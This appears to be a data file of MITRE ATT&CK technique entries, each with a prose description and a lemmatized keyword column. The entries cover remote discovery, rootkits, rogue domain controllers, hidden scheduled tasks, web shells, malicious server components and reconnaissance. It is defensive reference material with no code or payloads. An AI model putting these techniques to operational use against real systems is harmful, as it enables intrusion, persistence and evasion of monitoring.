T1018,Remote System Discovery,"Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as Ping or net view using Net.Adversaries may also analyze data from local host files (ex: C:\Windows\System32\Drivers\etc\hosts or /etc/hosts) or other passive means (such as local Arp cache entries) in order to discover the presence of remote systems in an environment.Adversaries may also target discovery of network infrastructure as well as leverage Network Device CLI commands on network devices to gather detailed information about systems within a network (e.g. show cdp neighbors, show arp).",adversary attempt listing system ip address hostname logical identifier network lateral movement current system functionality exist remote access tool enable utility available operate system ping net view net adversary analyze datum local host file ex host passive mean local arp cache entry order discover presence remote system environment adversary target discovery network infrastructure leverage network device cli command network device gather detailed information system network cdp neighbor arp
T1091,Replication Through Removable Media,"Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.Mobile devices may also be used to infect PCs with malware if connected via USB. For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).",adversary system possibly disconnected air gap network copy malware removable medium take advantage autorun feature media insert system execute case lateral movement occur modification executable file store removable medium copy malware rename look like legitimate file trick user execute separate system case initial access occur manual manipulation medium modification system initially format medium modification media firmware mobile device infect pc malware connect usb example smartphone connect system appear mount similar usb connect disk drive malware compatible connect system mobile device malware infect machine especially autorun feature enable
T1496,Resource Hijacking,"Adversaries may leverage the resources of co-opted systems in order to solve resource intensive problems, which may impact system and/or hosted service availability. One common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.Additionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it’s not competing for resources.Adversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitate Network Denial of Service campaigns and/or to seed malicious torrents.",adversary leverage resource co opt system order solve resource intensive problem impact system host service availability common purpose resource hijacking validate transaction cryptocurrency network earn virtual currency adversary consume system resource negatively impact cause affect machine unresponsive additionally cryptocurrency mining malware identify kill process compete malware ensure compete resource adversary use malware leverage system network bandwidth botnet order facilitate network denial service campaign seed malicious torrent
T1207,Rogue Domain Controller,"Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors).",adversary register rogue domain controller enable manipulation active directory datum dcshadow create rogue domain controller dc dcshadow method manipulate active directory ad datum include object schema register reuse inactive registration simulate behavior dc register rogue dc able inject replicate change ad infrastructure domain object include credential key register rogue dc involve create new server ntdsdsa object configuration partition ad schema require administrator privilege domain local dc krbtgt hash technique bypass system logging security monitor security information event management siem product action take rogue dc report sensor
T1014,Rootkit,"Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or System Firmware.",adversary use rootkit hide presence program file network connection service driver system component rootkit program hide existence malware intercept hook modify operate system api call supply system information rootkit rootkit enable functionality reside user kernel level operate system low include hypervisor master boot record system firmware
T1053,Scheduled Task/Job,"Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.",adversary abuse task scheduling functionality facilitate initial recurring execution malicious code utility exist major operate system schedule program script execute specified date time task schedule remote system provide proper authentication meet ex rpc file printer sharing windows environment schedule task remote system typically require member admin privileged group remote system adversary use task scheduling execute program system startup scheduled basis persistence mechanism abuse run process context specified account elevated permission privilege similar system binary proxy execution adversary abuse task scheduling potentially mask time execution trust system process
T1053.002,Scheduled Task/Job: At,"Adversaries may abuse the at utility to perform task scheduling for initial or recurring execution of malicious code. The at utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of Scheduled Task's schtasks in Windows environments, using at requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group.On Linux and macOS, at may be invoked by the superuser as well as any users added to the at.allow file. If the at.allow file does not exist, the at.deny file is checked. Every username not listed in at.deny is allowed to invoke at. If the at.deny exists and is empty, global use of at is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use at.Adversaries may use at to execute programs at system startup or on a scheduled basis for Persistence. at can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM).In Linux environments, adversaries may also abuse at to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, at may also be used for Privilege Escalation if the binary is allowed to run as superuser via sudo.",adversary abuse utility perform task scheduling initial recurring execution malicious code utility exist executable windows linux macos schedule task specified time date deprecate favor scheduled task schtask windows environment require task scheduler service run user log member local administrators group linux macos invoke superuser user add file file exist file check username list allow invoke exist global use permit file exist baseline superuser allow use adversary use execute program system startup scheduled basis persistence abuse conduct remote execution lateral movement run process context specify account linux environment adversary abuse break restrict environment task spawn interactive system shell run system command similarly privilege escalation binary allow run superuser sudo
T1053.003,Scheduled Task/Job: Cron,Adversaries may abuse the cron utility to perform task scheduling for initial or recurring execution of malicious code. The cron utility is a time-based job scheduler for Unix-like operating systems. The crontab file contains the schedule of cron entries to be run and the specified times for execution. Any crontab files are stored in operating system-specific file paths.An adversary may use cron in Linux or Unix environments to execute programs at system startup or on a scheduled basis for Persistence.,adversary abuse cron utility perform task scheduling initial recurring execution malicious code cron utility time base job scheduler unix like operate system crontab file contain schedule cron entry run specify time execution crontab file store operate system specific file path adversary use cron linux unix environment execute program system startup scheduled basis persistence
T1053.005,Scheduled Task/Job: Scheduled Task,"Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.The deprecated at utility could also be abused by adversaries (ex: At), though at.exe can not access tasks created with schtasks or the Control Panel.An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.Adversaries may also create ""hidden"" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from schtasks /query and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).",adversary abuse windows task scheduler perform task scheduling initial recurring execution malicious code multiple way access task scheduler windows schtask utility run directly command line task scheduler open gui administrator tools section control panel case adversary wrapper windows task scheduler alternatively adversary windows library create schedule task deprecated utility abuse adversary ex access task create schtask control panel adversary use windows task scheduler execute program system startup scheduled basis persistence windows task scheduler abuse conduct remote execution lateral movement run process context specify account system similar system binary proxy execution adversary abuse windows task scheduler potentially mask time execution sign trust system process adversary create hidden schedule task hide artifact visible defender tool manual query enumerate task specifically adversary hide task schtask task scheduler delete associate security descriptor sd registry value deletion value complete system permission
T1053.006,Scheduled Task/Job: Systemd Timers,"Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension .timer that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to Cron in Linux environments.Each .timer file must have a corresponding .service file with the same name, e.g., example.timer and example.service. .service files are Systemd Service unit files that are managed by the systemd system and service manager. Privileged timers are written to /etc/systemd/system/ and /usr/lib/systemd/system while user level are written to ~/.config/systemd/user/.An adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence. Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.",adversary abuse systemd timer perform task scheduling initial recurring execution malicious code systemd timer unit file file extension control service timer set run calendar event time span relative starting point alternative cron linux environment file correspond file file systemd service unit file manage systemd system service manager privileged timer write systemd lib systemd system user level write systemd adversary use systemd timer execute malicious code system startup scheduled basis persistence timer instal privileged path maintain root level persistence adversary install user level timer achieve user level persistence
T1053.007,Scheduled Task/Job: Container Orchestration Job,"Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.In Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.",adversary abuse task scheduling functionality provide container orchestration tool kubernetes schedule deployment container configure execute malicious code container orchestration job run automate task specific date time similar cron job linux system deployment type configure maintain quantity container time automate process maintain persistence cluster kubernetes cronjob schedule job run container perform specific task
T1029,Scheduled Transfer,"Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.When scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel or Exfiltration Over Alternative Protocol.",adversary schedule datum exfiltration perform certain time day certain interval blend traffic pattern normal activity availability schedule exfiltration exfiltration technique likely apply transfer information network exfiltration channel exfiltration alternative protocol
T1113,Screen Capture,"Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as CopyFromScreen, xwd, or screencapture.",adversary attempt screen capture desktop gather information course operation screen capturing functionality include feature remote access tool post compromise operation take screenshot typically possible native utility api call copyfromscreen xwd screencapture
T1597,Search Closed Sources,"Adversaries may search and gather information about victims from closed sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data.Adversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Valid Accounts).",adversary search gather information victim close source targeting information victim available purchase reputable private source database pay subscription feed technical threat intelligence datum adversary search different closed database depend information seek gather information source reveal opportunity form reconnaissance ex phishe information search open website domain establish operational resource ex develop capability obtain capability initial access ex external remote service valid account
T1597.001,Search Closed Sources: Threat Intel Vendors,"Adversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures.Adversaries may search in private threat intelligence vendor data to gather actionable information. Threat actors may seek information/indicators gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns. Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex: Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Exploit Public-Facing Application or External Remote Services).",adversary search private datum threat intelligence vendor information targeting threat intelligence vendor offer pay feed portal offer datum publicly report sensitive detail customer name identifier redact information contain trend breach target industry attribution claim successful ttps countermeasure adversary search private threat intelligence vendor datum gather actionable information threat actor seek information indicator gather campaign conduct adversary align target industry capability objective operational concern information report vendor reveal opportunity form reconnaissance ex search open websites domains establish operational resource ex develop capability obtain capability initial access ex exploit public facing application external remote services
T1597.002,Search Closed Sources: Purchase Technical Data,"Adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.Adversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim’s infrastructure. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Valid Accounts).",adversary purchase technical information victim targeting information victim available purchase reputable private source database pay subscription feed scan database data aggregation service adversary purchase information reputable source dark web cybercrime blackmarket adversary purchase information identify target use purchase datum discover opportunity successful breach threat actor gather technical detail purchase datum include limit employee contact information credential specific victim infrastructure information source reveal opportunity form reconnaissance ex phishe information search open website domain establish operational resource ex develop capability obtain capability initial access ex external remote services valid account
T1596,Search Open Technical Databases,"Adversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans.Adversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services or Trusted Relationship).",adversary search freely available technical database information victim targeting information victim available online database repository registration domain certificate public collection network datum artifact gather traffic scan adversary search different open database depend information seek gather information source reveal opportunity form reconnaissance ex phishe information search open website domain establish operational resource ex acquire infrastructure compromise infrastructure initial access ex external remote services trust relationship
T1596.001,Search Open Technical Databases: DNS/Passive DNS,"Adversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts.Adversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS). Adversaries may also seek and target DNS misconfigurations/leaks that reveal information about internal networks. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Search Victim-Owned Websites or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services or Trusted Relationship).",adversary search dns datum information victim targeting dns information include variety detail include register server record outline addressing target subdomain mail server host adversary search dns datum gather actionable information threat actor query nameserver target organization directly search centralized repository log dns query response know passive dns adversary seek target dns misconfiguration leak reveal information internal network information source reveal opportunity form reconnaissance ex search victim own website search open website domain establish operational resource ex acquire infrastructure compromise infrastructure initial access ex external remote services trusted relationship
T1596.002,Search Open Technical Databases: WHOIS,"Adversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers.Adversaries may search WHOIS data to gather actionable information. Threat actors can use online resources or command-line utilities to pillage through WHOIS data for information about potential victims. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Phishing for Information), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services or Trusted Relationship).",adversary search public whois datum information victim targeting whois datum store regional internet registry rir responsible allocate assign internet resource domain name query whois server information register domain assign ip block contact information dns nameserver adversary search whois datum gather actionable information threat actor use online resource command line utility pillage whois datum information potential victim information source reveal opportunity form reconnaissance ex active scanning phishing information establish operational resource ex acquire infrastructure compromise infrastructure initial access ex external remote service trusted relationship
T1596.003,Search Open Technical Databases: Digital Certificates,"Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.Adversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Phishing for Information), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Trusted Relationship).",adversary search public digital certificate datum information victim targeting digital certificate issue certificate authority order cryptographically verify origin sign content certificate encrypt web traffic https ssl tls communication contain information register organization location adversary search digital certificate datum gather actionable information threat actor use online resource lookup tool harvest information certificate information source reveal opportunity form reconnaissance ex active scanning phishing information establish operational resource ex develop capability obtain capability initial access ex external remote service trusted relationship
T1596.004,Search Open Technical Databases: CDNs,"Adversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor’s geographical region.Adversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organization’s website. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Drive-by Compromise).",adversary search content delivery network cdn datum victim targeting cdn allow organization host content distribute load balanced array server cdn allow organization customize content delivery base requestor geographical region adversary search cdn datum gather actionable information threat actor use online resource lookup tool harvest information content server cdn adversary seek target cdn misconfiguration leak sensitive information intend host protection mechanism ex login portal content host organization website information source reveal opportunity form reconnaissance ex active scanning search open websites domains establish operational resource ex acquire infrastructure compromise infrastructure initial access ex drive compromise
T1596.005,Search Open Technical Databases: Scan Databases,"Adversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.Adversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Exploit Public-Facing Application).",adversary search public scan database information victim targeting online service continuously publish result internet scan survey harvest information active ip address hostname open port certificate server banner adversary search scan database gather actionable information threat actor use online resource lookup tool harvest information service adversary seek information identify target use dataset discover opportunity successful breach information source reveal opportunity form reconnaissance ex active scanning search open websites domain establish operational resource ex develop capability obtain capability initial access ex external remote services exploit public facing application
T1593,Search Open Websites/Domains,"Adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts.Adversaries may search in different online sites depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: External Remote Services or Phishing).",adversary search freely available website domain information victim targeting information victim available online site social medium new site host information business operation hiring request reward contract adversary search different online site depend information seek gather information source reveal opportunity form reconnaissance ex phishe information search open technical database establish operational resource ex establish account compromise account initial access ex external remote service phishing
T1593.001,Search Open Websites/Domains: Social Media,"Adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff.Adversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victim’s into revealing specific information (i.e. Spearphishing Service). Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Spearphishing via Service).",adversary search social media information victim targeting social medium site contain information victim organization business announcement information role location interest staff adversary search different social medium site depend information seek gather threat actor passively harvest datum site use information gather create fake profile group elicit victim reveal specific information spearphishing service information source reveal opportunity form reconnaissance ex phishing information search open technical database establish operational resource ex establish account compromise account initial access ex spearphishing service
T1593.002,Search Open Websites/Domains: Search Engines,"Adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).Adversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Valid Accounts or Phishing).",adversary use search engine collect information victim targeting search engine service typical crawl online site index context provide user specialized syntax search specific keyword specific type content craft search engine query depend information seek gather threat actor use search engine harvest general information victim use specialized query look spillage leak sensitive information network detail credential information source reveal opportunity form reconnaissance ex phishe information search open technical database establish operational resource ex establish account compromise account initial access ex valid account phishing
T1593.003,Search Open Websites/Domains: Code Repositories,"Adversaries may search public code repositories for information about victims that can be used during targeting. Victims may store code in repositories on various third-party websites such as GitHub, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git. Adversaries may search various public code repositories for various information about a victim. Public code repositories can often be a source of various general information about victims, such as commonly used programming languages and libraries as well as the names of employees. Adversaries may also identify more sensitive data, including accidentally leaked credentials or API keys. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information), establishing operational resources (ex: Compromise Accounts or Compromise Infrastructure), and/or initial access (ex: Valid Accounts or Phishing). Note: This is distinct from Code Repositories, which focuses on Collection from private and internally hosted code repositories.",adversary search public code repository information victim targeting victim store code repository party website github gitlab sourceforge bitbucket user typically interact code repository web application command line utility git adversary search public code repository information victim public code repository source general information victim commonly programming language library name employee adversary identify sensitive datum include accidentally leak credential api key information source reveal opportunity form reconnaissance ex phishing information establish operational resource ex compromise accounts compromise infrastructure initial access ex valid accounts phishing note distinct code repositories focus collection private internally host code repository
T1594,Search Victim-Owned Websites,"Adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex: Email Addresses). These sites may also have details highlighting business operations and relationships.Adversaries may search victim-owned websites to gather actionable information. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Trusted Relationship or Phishing).",adversary search website own victim information targeting victim own website contain variety detail include name department division physical location datum key employee name role contact info ex email address site detail highlight business operation relationship adversary search victim own website gather actionable information information source reveal opportunity form reconnaissance ex phishe information search open technical database establish operational resource ex establish account compromise account initial access ex trust relationship phishing
T1505,Server Software Component,Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.,adversary abuse legitimate extensible development feature server establish persistent access system enterprise server application include feature allow developer write install software script extend functionality main application adversary install malicious component extend abuse server application
T1505.001,Server Software Component: SQL Stored Procedures,"Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).Adversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers. Microsoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.).",adversary abuse sql store procedure establish persistent access system sql stored procedures code save reuse database user waste time rewrite frequently sql query store procedure invoke sql statement database procedure define event sql server application start craft malicious store procedure provide persistence mechanism sql database server microsoft sql server enable common language runtime clr integration clr integration enable application developer write store procedure framework language vb c etc
T1505.002,Server Software Component: Transport Agent,"Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails. Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. Adversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events. Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary.",adversary abuse microsoft transport agent establish persistent access system microsoft exchange transport agent operate email message pass transport pipeline perform task filter spam filter malicious attachment journaling add corporate signature end outgoing email transport agent write application developer compile assembly subsequently register exchange server transport agent invoke specify stage email processing carry developer define task adversary register malicious transport agent provide persistence mechanism exchange server trigger adversary specify email event malicious transport agent invoke email pass exchange transport pipeline agent configure carry specific task response adversary define criterion example transport agent carry action like copy transit attachment save later exfiltration recipient email address match entry list provide adversary
T1505.003,Server Software Component: Web Shell,"Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. China Chopper Web shell client).",adversary backdoor web server web shell establish persistent access system web shell web script place openly accessible web server allow adversary use web server gateway network web shell provide set function execute command line interface system host web server addition server script web shell client interface program talk web server china chopper web shell client
T1505.004,Server Software Component: IIS Components,"Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: Get{Extension/Filter}Version, Http{Extension/Filter}Proc, and (optionally) Terminate{Extension/Filter}. IIS modules may also be installed to extend IIS web servers.Adversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.Adversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exports RegisterModule, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.",adversary install malicious component run internet information services iis web server establish persistence iis provide mechanism extend functionality web server example internet server application programming interface isapi extension filter instal examine modify incoming outgoing iis web request extension filter deploy dll file export function optionally filter iis module instal extend iis web server adversary install malicious isapi extension filter observe modify traffic execute command compromised machine proxy command control traffic isapi extension filter access iis web request response example adversary abuse mechanism modify http response order distribute malicious command content previously comprise host adversary install malicious iis module observe modify traffic iis introduce module provide unrestricted access http request response isapi extension filter iis module write dll export registermodule application interface api access iis http request
T1505.005,Server Software Component: Terminal Services DLL,"Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.Windows Services that are run as a ""generic"" process (ex: svchost.exe) load the service's DLL file, the location of which is stored in a Registry entry named ServiceDll. The termsrv.dll file, typically stored in %SystemRoot%\System32\, is the default ServiceDll value for Terminal Services in HKLM\System\CurrentControlSet\services\TermService\Parameters\.Adversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts. On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.",adversary abuse component terminal services enable persistent access system microsoft terminal services rename remote desktop services windows server os enable remote terminal connection host terminal services allow server transmit interactive graphical user interface client service run generic process ex load service dll file location store registry entry name servicedll file typically store default servicedll value terminal services modify replace terminal services dll enable persistent access victimize host non server windows os increase functionality enable adversary avoid terminal services prompt warn log user system new rdp session create
T1648,Serverless Execution,"Adversaries may abuse serverless computing, integration, and automation services to execute arbitrary code in cloud environments. Many cloud providers offer a variety of serverless resources, including compute engines, application integration services, and web servers. Adversaries may abuse these resources in various ways as a means of executing arbitrary commands. For example, adversaries may use serverless functions to execute malicious code, such as crypto-mining malware (i.e. Resource Hijacking).Serverless functions can also be invoked in response to cloud events (i.e. Event Triggered Execution), potentially enabling persistent execution over time. For example, in AWS environments, an adversary may create a Lambda function that automatically adds Additional Cloud Credentials to a user and a corresponding CloudWatch events rule that invokes that function whenever a new user is created.",adversary abuse serverless computing integration automation service execute arbitrary code cloud environment cloud provider offer variety serverless resource include compute engine application integration service web server adversary abuse resource way means execute arbitrary command example adversary use serverless function execute malicious code crypto mining malware resource function invoke response cloud event event trigger execution potentially enable persistent execution time example aws environment adversary create lambda function automatically add additional cloud credentials user correspond cloudwatch event rule invoke function new user create
